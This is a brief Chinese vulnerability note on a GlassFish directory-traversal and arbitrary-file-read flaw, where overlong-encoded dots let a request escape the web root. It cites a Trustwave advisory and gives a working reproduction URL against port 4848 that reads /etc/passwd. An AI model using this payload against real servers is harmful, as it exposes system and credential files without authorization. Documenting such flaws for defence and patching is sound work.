# GlassFish 任意文件读取漏洞

## 漏洞描述
参考阅读：

- https://www.trustwave.com/Resources/Security-Advisories/Advisories/TWSL2015-016/?fid=6904

java语言中会把`%c0%ae`解析为`\uC0AE`，最后转义为ASCCII字符的`.`（点）。利用`%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/`来向上跳转，达到目录穿越、任意文件读取的效果。

## 危害等级
CRITICAL

## 参考链接
- https://www.trustwave.com/Resources/Security-Advisories/Advisories/TWSL2015-016/?fid=6904

## 漏洞复现方法
访问`https://your-ip:4848/theme/META-INF/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/etc/passwd`，发现已成功读取`/etc/passwd`内容：

![image-20220223221248955](images/202202232212069.png)
